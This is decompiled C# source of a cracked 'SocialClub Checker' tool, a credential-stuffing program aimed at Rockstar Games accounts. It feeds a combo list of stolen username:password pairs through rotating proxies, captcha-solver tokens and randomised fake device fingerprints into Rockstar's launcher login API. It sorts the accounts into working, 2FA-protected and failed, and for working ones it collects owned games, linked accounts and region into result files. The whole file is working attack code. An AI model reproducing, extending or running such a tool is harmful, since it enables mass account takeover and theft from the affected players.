using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Leaf.xNet;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;

namespace SocialClub_Account_Checker
{
	// Token: 0x0200001A RID: 26
	internal class Checker
	{
		// Token: 0x0600009C RID: 156 RVA: 0x00004584 File Offset: 0x00002784
		public void Initialize(dynamic values)
		{
			AsyncQueue<string> comboQueue = Variables.ComboQueue;
			if (Checker.<>o__0.<>p__1 == null)
			{
				Checker.<>o__0.<>p__1 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Checker)));
			}
			Func<CallSite, object, string> target = Checker.<>o__0.<>p__1.Target;
			CallSite <>p__ = Checker.<>o__0.<>p__1;
			if (Checker.<>o__0.<>p__0 == null)
			{
				Checker.<>o__0.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "combo", typeof(Checker), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			comboQueue.EnqueueRange(File.ReadLines(target(<>p__, Checker.<>o__0.<>p__0.Target(Checker.<>o__0.<>p__0, values))).ToArray<string>());
			Variables.Remaining = Variables.ComboQueue.Count;
			List<string> proxyList = Variables.ProxyList;
			if (Checker.<>o__0.<>p__3 == null)
			{
				Checker.<>o__0.<>p__3 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Checker)));
			}
			Func<CallSite, object, string> target2 = Checker.<>o__0.<>p__3.Target;
			CallSite <>p__2 = Checker.<>o__0.<>p__3;
			if (Checker.<>o__0.<>p__2 == null)
			{
				Checker.<>o__0.<>p__2 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "proxy", typeof(Checker), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			proxyList.AddRange(File.ReadLines(target2(<>p__2, Checker.<>o__0.<>p__2.Target(Checker.<>o__0.<>p__2, values))).ToArray<string>());
			if (Checker.<>o__0.<>p__5 == null)
			{
				Checker.<>o__0.<>p__5 = CallSite<Func<CallSite, object, int>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(int), typeof(Checker)));
			}
			Func<CallSite, object, int> target3 = Checker.<>o__0.<>p__5.Target;
			CallSite <>p__3 = Checker.<>o__0.<>p__5;
			if (Checker.<>o__0.<>p__4 == null)
			{
				Checker.<>o__0.<>p__4 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "threads", typeof(Checker), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Variables.Threads = target3(<>p__3, Checker.<>o__0.<>p__4.Target(Checker.<>o__0.<>p__4, values));
			if (Checker.<>o__0.<>p__7 == null)
			{
				Checker.<>o__0.<>p__7 = CallSite<Func<CallSite, object, int>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(int), typeof(Checker)));
			}
			Func<CallSite, object, int> target4 = Checker.<>o__0.<>p__7.Target;
			CallSite <>p__4 = Checker.<>o__0.<>p__7;
			if (Checker.<>o__0.<>p__6 == null)
			{
				Checker.<>o__0.<>p__6 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "timeout", typeof(Checker), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Variables.Timeout = target4(<>p__4, Checker.<>o__0.<>p__6.Target(Checker.<>o__0.<>p__6, values));
			if (Checker.<>o__0.<>p__9 == null)
			{
				Checker.<>o__0.<>p__9 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(Checker)));
			}
			Func<CallSite, object, string> target5 = Checker.<>o__0.<>p__9.Target;
			CallSite <>p__5 = Checker.<>o__0.<>p__9;
			if (Checker.<>o__0.<>p__8 == null)
			{
				Checker.<>o__0.<>p__8 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "proxyType", typeof(Checker), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Variables.ProxyType = target5(<>p__5, Checker.<>o__0.<>p__8.Target(Checker.<>o__0.<>p__8, values));
		}

		// Token: 0x0600009D RID: 157 RVA: 0x0000275A File Offset: 0x0000095A
		public void AddCaptchaToken(string token)
		{
			if (Variables.TokenQueue.Contains(token))
			{
				return;
			}
			Variables.TokenQueue.Enqueue(token);
		}

		// Token: 0x0600009E RID: 158 RVA: 0x0000489C File Offset: 0x00002A9C
		public void Start()
		{
			Checker.UpdateTitle();
			Variables.ResultsDirectory = string.Format("Resultados\\result {0:dd-MM-yy-hh-mm-ss}", DateTime.Now);
			Directory.CreateDirectory(Variables.ResultsDirectory);
			Program.MainForm.Invoke(new MethodInvoker(delegate()
			{
				Program.MainForm.Width = 1240;
				for (int i = 0; i < Variables.Threads; i++)
				{
					Task.Factory.StartNew<Task>(async delegate()
					{
						while (Variables.Remaining > 0)
						{
							Thread.Sleep(100);
							if (Variables.TokenQueue.Count != 0)
							{
								string text = null;
								string[] array;
								try
								{
									TaskAwaiter<string> awaiter = Variables.TokenQueue.DequeueAsync().GetAwaiter();
									bool isCompleted = awaiter.IsCompleted;
									text = awaiter.GetResult();
									awaiter = Variables.ComboQueue.DequeueAsync().GetAwaiter();
									bool isCompleted2 = awaiter.IsCompleted;
									array = awaiter.GetResult().Split(new char[]
									{
										':'
									});
								}
								catch
								{
									if (text != null)
									{
										Variables.TokenQueue.Enqueue(text);
									}
									continue;
								}
								string proxyAddress = Variables.ProxyList[Variables.Random.Next(0, Variables.ProxyList.Count)];
								ProxyClient proxyClient = null;
								try
								{
									if (Variables.ProxyType.Equals("http/https"))
									{
										proxyClient = HttpProxyClient.Parse(proxyAddress);
									}
									else if (Variables.ProxyType.Equals("socks4"))
									{
										proxyClient = Socks4ProxyClient.Parse(proxyAddress);
									}
									else if (Variables.ProxyType.Equals("socks5"))
									{
										proxyClient = Socks5ProxyClient.Parse(proxyAddress);
									}
								}
								catch
								{
									Variables.TokenQueue.Enqueue(text);
									Variables.ComboQueue.Enqueue(string.Join(":", array));
									Variables.Errors++;
									continue;
								}
								finally
								{
									Checker.UpdateTitle();
								}
								proxyClient.ConnectTimeout = Variables.Timeout;
								proxyClient.ReadWriteTimeout = Variables.Timeout;
								HttpRequest httpRequest = new HttpRequest();
								httpRequest.KeepAlive = true;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.ConnectTimeout = Variables.Timeout;
								httpRequest.ReadWriteTimeout = Variables.Timeout;
								httpRequest.UserAgent = Http.RandomUserAgent();
								httpRequest.Proxy = proxyClient;
								try
								{
									httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, new RemoteCertificateValidationCallback(delegate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
									{
										string publicKeyString = certificate.GetPublicKeyString();
										return sslPolicyErrors.Equals(SslPolicyErrors.None) && publicKeyString != null && publicKeyString.Equals(Variables.string_0);
									}));
									httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
									int num = Variables.Random.Next(1000000000, int.MaxValue);
									try
									{
										HttpResponse httpResponse = httpRequest.Post("https://rgl.rockstargames.com/api/launcher/login", JsonConvert.SerializeObject(new
										{
											Fingerprint = string.Format("{{\"fp\":{{\"cpuInfo0\":\"{0}\",\"cpuInfo1\":\"{1}\",\"cpuInfo2\":\"{2}\",\"cpuInfo3\":\"{3}\",\"computerName\":\"{4}\",\"volumeSerial\":\"{5}\",\"volumeName\":\"{6}\",\"fileSystemName\":\"{7}\",\"device_name\":\"Rockstar Games on PC\"}}}}", new object[]
											{
												num,
												num,
												num,
												num,
												num,
												num,
												num,
												num
											}),
											IsCaptcha = true,
											Lang = "en-US",
											RosVersion = 11,
											arkoseCaptchaResponse = text,
											env = "prod",
											gamePlatform = "pc",
											platform = "pcros",
											title = "launcher",
											userLogin = array[0],
											userPassword = array[1],
											version = 11
										}), "application/json");
										Leaf.xNet.HttpStatusCode statusCode = httpResponse.StatusCode;
										if (statusCode != Leaf.xNet.HttpStatusCode.OK)
										{
											if (statusCode != Leaf.xNet.HttpStatusCode.Unauthorized)
											{
												if (statusCode != Leaf.xNet.HttpStatusCode.Forbidden)
												{
													Variables.ComboQueue.Enqueue(string.Join(":", array));
													Variables.TokenQueue.Enqueue(text);
													Variables.Errors++;
												}
												else
												{
													Variables.ComboQueue.Enqueue(string.Join(":", array));
													Variables.Errors++;
												}
											}
											else
											{
												Console.ForegroundColor = ConsoleColor.Red;
												Console.WriteLine(string.Join(":", array) + " | Mala");
												Checker.AppendToFile(Path.Combine(Variables.ResultsDirectory, "Malas.txt"), string.Join(":", array));
												Variables.CPM += (++Variables.Checked - Variables.PreviousChecked) * 60;
												Variables.CPMTimer.Stop();
												Variables.CPMTimer.Start();
												Variables.Remaining--;
												Variables.Bad++;
											}
										}
										else
										{
											Checker.SCLogin sclogin = JsonConvert.DeserializeObject<Checker.SCLogin>(httpResponse.ToString());
											if (sclogin.MfaEnabled)
											{
												Console.ForegroundColor = ConsoleColor.Yellow;
												Console.WriteLine(string.Join(":", array) + " | 2FA");
												Checker.AppendToFile(Path.Combine(Variables.ResultsDirectory, "2FA.txt"), string.Join(":", array));
												Variables.CPM += (++Variables.Checked - Variables.PreviousChecked) * 60;
												Variables.CPMTimer.Stop();
												Variables.CPMTimer.Start();
												Variables.Remaining--;
												Variables.Bad++;
											}
											else
											{
												string countryCode = sclogin.CountryCode;
												string text2 = sclogin.EmailValidated ? "Si" : "No";
												string nickname = sclogin.Nickname;
												string xml = sclogin.Xml;
												httpRequest.Proxy = null;
												httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
												httpRequest.AddHeader("Authorization", "SCAUTH val=\"" + sclogin.Ticket + "\"");
												Checker.Class1 @class;
												List<string> list;
												for (;;)
												{
													try
													{
														HttpResponse httpResponse2 = httpRequest.Post("https://rgl.rockstargames.com/api/profile/getanalyticsdata", "{}", "application/json");
														if (httpResponse2.StatusCode == Leaf.xNet.HttpStatusCode.TooManyRequests)
														{
															proxyAddress = Variables.ProxyList[Variables.Random.Next(0, Variables.ProxyList.Count)];
															proxyClient = null;
															try
															{
																if (Variables.ProxyType.Equals("http/https"))
																{
																	proxyClient = HttpProxyClient.Parse(proxyAddress);
																}
																else if (Variables.ProxyType.Equals("socks4"))
																{
																	proxyClient = Socks4ProxyClient.Parse(proxyAddress);
																}
																else if (Variables.ProxyType.Equals("socks5"))
																{
																	proxyClient = Socks5ProxyClient.Parse(proxyAddress);
																}
															}
															catch
															{
																Variables.TokenQueue.Enqueue(text);
																Variables.ComboQueue.Enqueue(string.Join(":", array));
																Variables.Errors++;
																continue;
															}
															finally
															{
																Checker.UpdateTitle();
															}
															httpRequest.Proxy = proxyClient;
															continue;
														}
														@class = JsonConvert.DeserializeObject<Checker.Class1>(httpResponse2.ToString());
														list = (from game in @class.GamesOwned.Split(new char[]
														{
															'|'
														})
														where !game.Equals("Launcher_PC") && !game.Equals("GTAV_PC")
														select game).ToList<string>();
													}
													catch
													{
														continue;
													}
													break;
												}
												int num2;
												string text3 = Marshal.PtrToStringAnsi(RosPatches.check_grand_theft_auto_v(xml, out num2));
												while (num2 != 0 && num2 != 4)
												{
													Thread.Sleep(100);
													text3 = Marshal.PtrToStringAnsi(RosPatches.check_grand_theft_auto_v(xml, out num2));
												}
												if (!string.IsNullOrEmpty(text3))
												{
													if (text3.Contains(", "))
													{
														list.AddRange(text3.Split(new string[]
														{
															", "
														}, StringSplitOptions.None));
													}
													else
													{
														list.Add(text3);
													}
												}
												list.Sort();
												list = list.Select((string game, int index) => string.Format("[{0}] {1}", ++index, game)).ToList<string>();
												string text4 = string.Join(", ", @class.LinkedAccounts.Split(new char[]
												{
													'|'
												}));
												if (list != null && list.Count != 0)
												{
													Console.ForegroundColor = ConsoleColor.Green;
													Console.WriteLine(string.Format("Credenciales: {0}\nUsuario: {1}\nRegion: {2}\nJuegos: {3}\nEmail Verificado: {4}\nCuentas Vinculadas: {5}\n---------------->Juegos<----------------\n{6}\n------------->Alko Community<-------------\n", new object[]
													{
														string.Join(":", array),
														nickname,
														countryCode,
														list.Count,
														text2,
														text4,
														string.Join("\n", list)
													}));
													Checker.AppendToFile(Path.Combine(Variables.ResultsDirectory, "Buenas.txt"), string.Format("Account Credenciales: {0}\r\nUsuario: {1}\r\nRegion: {2}\r\nJuegos: {3}\r\nVerificada: {4}\r\nCuentas Vinculadas: {5}\r\n---------------->Juegos<----------------\r\n{6}\r\n------------->Alko Community<-------------\r\n", new object[]
													{
														string.Join(":", array),
														nickname,
														countryCode,
														list.Count,
														text2,
														text4,
														string.Join("\r\n", list)
													}));
													Variables.Good++;
												}
												else
												{
													Console.ForegroundColor = ConsoleColor.Cyan;
													Console.WriteLine(string.Format("Credenciales: {0}\nUsuario: {1}\nRegion: {2}\nJuegos: {3}\nVerificado: {4}\nCuentas Vinculadas: {5}\n---------------->Juegos<----------------\n{6}\n------------->Alko Community<-------------\n", new object[]
													{
														string.Join(":", array),
														nickname,
														countryCode,
														list.Count,
														text2,
														text4,
														string.Join("\n", list)
													}));
													Checker.AppendToFile(Path.Combine(Variables.ResultsDirectory, "Sin Juegos.txt"), string.Format("Credenciales: {0}\r\nUsuario: {1}\r\nRegion: {2}\r\nJuegos: {3}\r\nEmail Verificado: {4}\r\nCuentas Vinculadas: {5}\r\n---------------->Juegos<----------------\r\n{6}\r\n------------->Alko Community<-------------\r\n", new object[]
													{
														string.Join(":", array),
														nickname,
														countryCode,
														list.Count,
														text2,
														text4,
														string.Join("\r\n", list)
													}));
													Variables.Good++;
												}
												Variables.CPM += (++Variables.Checked - Variables.PreviousChecked) * 60;
												Variables.CPMTimer.Stop();
												Variables.CPMTimer.Start();
												Variables.Remaining--;
											}
										}
									}
									catch
									{
										Variables.ComboQueue.Enqueue(string.Join(":", array));
										if (httpRequest.Address.AbsolutePath.Equals("/api/launcher/login"))
										{
											Variables.TokenQueue.Enqueue(text);
										}
										Variables.Errors++;
									}
									finally
									{
										Checker.UpdateTitle();
									}
								}
								finally
								{
									if (httpRequest != null)
									{
										((IDisposable)httpRequest).Dispose();
									}
								}
								text = null;
							}
						}
						if (--Variables.Remaining == -1)
						{
							foreach (CancellationTokenSource cancellationTokenSource in Variables.TwoCaptchaSources)
							{
								cancellationTokenSource.Cancel();
							}
							Variables.TwoCaptchaSources.Clear();
							foreach (CancellationTokenSource cancellationTokenSource2 in Variables.CapMonsterCloudSources)
							{
								cancellationTokenSource2.Cancel();
							}
							Variables.CapMonsterCloudSources.Clear();
							Program.MainForm.Invoke(new MethodInvoker(delegate()
							{
								if (MessageBox.Show("Finalizado!\nQuieres Ver Los Resultados?", "SocialClub Checker Alko Community", MessageBoxButtons.YesNo) == DialogResult.Yes)
								{
									Process.Start("explorer.exe", Path.Combine(Environment.CurrentDirectory, Variables.ResultsDirectory));
								}
								Program.MainForm.Width = 782;
								Program.MainForm.Text = "SocialClub Checker | Alko Community Cracked by Eternity#3333";
								Program.MainForm.browser.Load(string.Format("http://{0}:{1}/initialize", IPAddress.Loopback, Program.Port));
							}));
							Variables.CPMTimer.Stop();
							Variables.CPMTimer.Enabled = false;
							Variables.CPM = 0;
							Variables.Checked = 0;
							Variables.Remaining = 0;
							Variables.Good = 0;
							Variables.Bad = 0;
							Variables.Errors = 0;
							Variables.ProxyList.Clear();
						}
					}, TaskCreationOptions.LongRunning);
				}
			}));
			Variables.CPMTimer.Enabled = true;
			Variables.CPMTimer.Elapsed += delegate(object sender, ElapsedEventArgs e)
			{
				Variables.CPM = (Variables.Checked - Variables.PreviousChecked) * 60;
				Variables.PreviousChecked = Variables.Checked;
			};
			Variables.CPMTimer.Start();
		}

		// Token: 0x0600009F RID: 159 RVA: 0x0000493C File Offset: 0x00002B3C
		private static void AppendToFile(string filePath, string text)
		{
			object locker = Variables.Locker;
			lock (locker)
			{
				using (FileStream fileStream = new FileStream(filePath, FileMode.Append, FileAccess.Write, FileShare.Read))
				{
					using (StreamWriter streamWriter = new StreamWriter(fileStream, Encoding.Unicode))
					{
						streamWriter.WriteLine(text);
					}
				}
			}
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00002775 File Offset: 0x00000975
		private static void UpdateTitle()
		{
			Program.MainForm.Invoke(new MethodInvoker(delegate()
			{
				Program.MainForm.Text = string.Format("Social Club Checker | Alko Community Cracked by Eternity#3333 | Checked: {0} | Remaining: {1} | Good: {2} | Bad: {3} | CPM: {4} | Errors: {5}", new object[]
				{
					Variables.Checked,
					Variables.Remaining,
					Variables.Good,
					Variables.Bad,
					Variables.CPM,
					Variables.Errors
				});
			}));
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00002383 File Offset: 0x00000583
		public Checker()
		{
			Class3.oswSa3wz9mgro();
			base..ctor();
		}

		// Token: 0x0200001B RID: 27
		private class SCLogin
		{
			// Token: 0x1700002C RID: 44
			// (get) Token: 0x060000A2 RID: 162 RVA: 0x000027A1 File Offset: 0x000009A1
			// (set) Token: 0x060000A3 RID: 163 RVA: 0x000027A9 File Offset: 0x000009A9
			[JsonProperty("Age")]
			public long Age { get; set; }

			// Token: 0x1700002D RID: 45
			// (get) Token: 0x060000A4 RID: 164 RVA: 0x000027B2 File Offset: 0x000009B2
			// (set) Token: 0x060000A5 RID: 165 RVA: 0x000027BA File Offset: 0x000009BA
			[JsonProperty("CountryCode")]
			public string CountryCode { get; set; }

			// Token: 0x1700002E RID: 46
			// (get) Token: 0x060000A6 RID: 166 RVA: 0x000027C3 File Offset: 0x000009C3
			// (set) Token: 0x060000A7 RID: 167 RVA: 0x000027CB File Offset: 0x000009CB
			[JsonProperty("EmailValidated")]
			public bool EmailValidated { get; set; }

			// Token: 0x1700002F RID: 47
			// (get) Token: 0x060000A8 RID: 168 RVA: 0x000027D4 File Offset: 0x000009D4
			// (set) Token: 0x060000A9 RID: 169 RVA: 0x000027DC File Offset: 0x000009DC
			[JsonProperty("MfaEnabled")]
			public bool MfaEnabled { get; set; }

			// Token: 0x17000030 RID: 48
			// (get) Token: 0x060000AA RID: 170 RVA: 0x000027E5 File Offset: 0x000009E5
			// (set) Token: 0x060000AB RID: 171 RVA: 0x000027ED File Offset: 0x000009ED
			[JsonProperty("Nickname")]
			public string Nickname { get; set; }

			// Token: 0x17000031 RID: 49
			// (get) Token: 0x060000AC RID: 172 RVA: 0x000027F6 File Offset: 0x000009F6
			// (set) Token: 0x060000AD RID: 173 RVA: 0x000027FE File Offset: 0x000009FE
			[JsonProperty("Ticket")]
			public string Ticket { get; set; }

			// Token: 0x17000032 RID: 50
			// (get) Token: 0x060000AE RID: 174 RVA: 0x00002807 File Offset: 0x00000A07
			// (set) Token: 0x060000AF RID: 175 RVA: 0x0000280F File Offset: 0x00000A0F
			[JsonProperty("Xml")]
			public string Xml { get; set; }

			// Token: 0x060000B0 RID: 176 RVA: 0x00002383 File Offset: 0x00000583
			public SCLogin()
			{
				Class3.oswSa3wz9mgro();
				base..ctor();
			}
		}

		// Token: 0x0200001C RID: 28
		private class Class1
		{
			// Token: 0x17000033 RID: 51
			// (get) Token: 0x060000B1 RID: 177 RVA: 0x00002818 File Offset: 0x00000A18
			// (set) Token: 0x060000B2 RID: 178 RVA: 0x00002820 File Offset: 0x00000A20
			[JsonProperty("gamesOwned")]
			public string GamesOwned { get; set; }

			// Token: 0x17000034 RID: 52
			// (get) Token: 0x060000B3 RID: 179 RVA: 0x00002829 File Offset: 0x00000A29
			// (set) Token: 0x060000B4 RID: 180 RVA: 0x00002831 File Offset: 0x00000A31
			[JsonProperty("linkedAccounts")]
			public string LinkedAccounts { get; set; }

			// Token: 0x060000B5 RID: 181 RVA: 0x00002383 File Offset: 0x00000583
			public Class1()
			{
				Class3.oswSa3wz9mgro();
				base..ctor();
			}
		}
	}
}
